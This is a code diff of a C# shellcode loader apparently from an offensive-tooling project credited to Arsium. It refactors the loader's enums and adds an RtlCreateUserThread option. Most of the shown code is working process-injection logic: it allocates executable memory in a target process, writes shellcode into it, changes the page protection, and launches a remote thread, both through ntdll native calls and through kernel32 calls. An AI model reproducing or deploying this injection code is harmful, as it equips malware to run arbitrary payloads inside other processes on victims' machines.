@@ -2,6 +2,7 @@
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using static ShellCodeLoader.Shared;
 /*
 || AUTHOR Arsium ||
 || github : https://github.com/arsium       ||
@@ -36,30 +37,33 @@ namespace ShellCodeLoader
 
         private void NT()
         {
-            Imports.NtAllocateVirtualMemory(Target.Handle, ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+            Imports.NtAllocateVirtualMemory(Target.Handle, ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
             UIntPtr bytesWritten;
             Imports.NtWriteVirtualMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
-            Imports.PageProtection flOld = new Imports.PageProtection();
-            Imports.NtProtectVirtualMemory(Target.Handle, ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);
+            PageProtection flOld = new PageProtection();
+            Imports.NtProtectVirtualMemory(Target.Handle, ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);
             IntPtr hThread = IntPtr.Zero;
-            Imports.NtCreateThreadEx(ref hThread, Imports.AccessMask.GENERIC_EXECUTE, IntPtr.Zero, Target.Handle, ptr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            Imports.NtCreateThreadEx(ref hThread, AccessMask.GENERIC_EXECUTE, IntPtr.Zero, Target.Handle, ptr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            //
+            //Imports.CLIENT_ID cid = new Imports.CLIENT_ID();
+            //Imports.RtlCreateUserThread(Target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, ptr, IntPtr.Zero, ref hThread, cid);
         }
 
         private void Kernel32()
         {
-            this.ptr = Imports.VirtualAllocEx(Target.Handle, IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+            this.ptr = Imports.VirtualAllocEx(Target.Handle, IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
             UIntPtr writtenBytes;
             Imports.WriteProcessMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
-            Imports.PageProtection flOld;
-            Imports.VirtualProtectEx(Target.Handle, ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
+            PageProtection flOld;
+            Imports.VirtualProtectEx(Target.Handle, ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);
             IntPtr hThread = Imports.CreateRemoteThread(Target.Handle, IntPtr.Zero, 0, ptr, IntPtr.Zero, Imports.ThreadCreationFlags.NORMAL, out hThread);
         }
 
         private static class Imports
         {
-
             internal const String KERNEL32 = "kernel32.dll";
             internal const String NTDLL = "ntdll.dll";
+
 
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
@@ -76,6 +80,8 @@ namespace ShellCodeLoader
             [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtCreateThreadEx(ref IntPtr threadHandle, AccessMask desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
 
+            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+            public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);
 
 
             [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
@@ -103,6 +109,8 @@ namespace ShellCodeLoader
             [DllImport(KERNEL32)]
             public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+
+            [Flags]
             public enum ThreadCreationFlags : uint
             {
                 NORMAL = 0x0,
@@ -110,47 +118,11 @@ namespace ShellCodeLoader
                 STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
             }
 
-            public enum AccessMask : uint 
+            [StructLayout(LayoutKind.Sequential, Pack = 0)]
+            public struct CLIENT_ID
             {
-                GENERIC_READ = 0x80000000,
-                GENERIC_WRITE = 0x40000000,
-                GENERIC_EXECUTE = 0x20000000,
-                GENERIC_ALL = 0x10000000
-            }
-
-            public enum PageProtection : uint
-            {
-                PAGE_EXECUTE = 0x10,
-                PAGE_EXECUTE_READ = 0x20,
-                PAGE_EXECUTE_READWRITE = 0x40,
-                PAGE_EXECUTE_WRITECOPY = 0x80,
-                PAGE_NOACCESS = 0x01,
-                PAGE_READONLY = 0x02,
-                PAGE_READWRITE = 0x04,
-                PAGE_WRITECOPY = 0x08,
-                PAGE_TARGETS_INVALID = 0x40000000,
-                PAGE_TARGETS_NO_UPDATE = 0x40000000,
-                PAGE_GUARD = 0x100,
-                PAGE_NOCACHE = 0x200,
-                PAGE_WRITECOMBINE = 0x400
-            }
-            public enum TypeAlloc : uint
-            {
-                MEM_COMMIT = 0x00001000,
-                MEM_RESERVE = 0x00002000,
-                MEM_RESET = 0x00080000,
-                MEM_RESET_UNDO = 0x1000000,
-                MEM_LARGE_PAGES = 0x20000000,
-                MEM_PHYSICAL = 0x00400000,
-                MEM_TOP_DOWN = 0x00100000,
-                MEM_WRITE_WATCH = 0x00200000
-            }
-            public enum FreeType : uint
-            {
-                MEM_DECOMMIT = 0x00004000,
-                MEM_RELEASE = 0x00008000,
-                MEM_COALESCE_PLACEHOLDERS = 0x00000001,
-                MEM_PRESERVE_PLACEHOLDER = 0x00000002
+                public IntPtr UniqueProcess;
+                public IntPtr UniqueThread;
             }
         }
 
